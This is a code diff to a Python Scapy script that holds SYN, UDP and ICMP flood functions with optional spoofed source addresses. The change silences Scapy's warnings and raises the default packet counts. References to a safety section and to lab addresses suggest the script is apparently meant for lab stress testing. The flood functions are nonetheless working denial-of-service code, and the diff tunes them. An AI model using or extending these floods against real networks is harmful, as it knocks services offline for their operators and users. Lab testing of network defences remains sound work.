@@ -26,9 +26,11 @@ IMPORTANT SAFETY:
 import argparse
 import random
 import time
+import logging
 from scapy.all import IP, TCP, UDP, ICMP, Raw, send, sendp, sr1, conf
 
-# Try to speed up sends on some platforms
+# Suppress Scapy warnings and verbose output
+logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
 conf.verb = 0
 
 def pace_loop(total, rate):
@@ -50,7 +52,7 @@ def random_ipv4():
     # Avoid generating multicast/0/255 addresses; generate private-ish addresses for lab
     return "192.168.{}.{:d}".format(random.randint(0, 255), random.randint(2, 254))
 
-def syn_flood(target, dport=80, count=100, rate=1000, spoof=False):
+def syn_flood(target, dport=80, count=200, rate=1000, spoof=False):
     """Send many TCP SYN packets to target:dport."""
     print(f"[SYN flood] target={target}:{dport}, count={count}, rate={rate}, spoof={spoof}")
     for _ in pace_loop(count, rate):
@@ -60,7 +62,7 @@ def syn_flood(target, dport=80, count=100, rate=1000, spoof=False):
         pkt = ip / TCP(sport=sport, dport=dport, flags="S", seq=random.randint(0, 0xFFFFFFFF))
         send(pkt, verbose=False)
 
-def udp_flood(target, dport=5000, count=100, rate=1000, payload_size=100, spoof=False):
+def udp_flood(target, dport=5000, count=200, rate=1000, payload_size=100, spoof=False):
     """Send many UDP packets with a payload."""
     print(f"[UDP flood] target={target}:{dport}, count={count}, rate={rate}, payload={payload_size}, spoof={spoof}")
     for _ in pace_loop(count, rate):
@@ -71,7 +73,7 @@ def udp_flood(target, dport=5000, count=100, rate=1000, payload_size=100, spoof=
         pkt = ip / UDP(sport=sport, dport=dport) / Raw(load=data)
         send(pkt, verbose=False)
 
-def icmp_flood(target, count=100, rate=1000):
+def icmp_flood(target, count=200, rate=1000):
     """High-rate ICMP echo requests (ping flood)."""
     print(f"[ICMP flood] target={target}, count={count}, rate={rate}")
     for _ in pace_loop(count, rate):
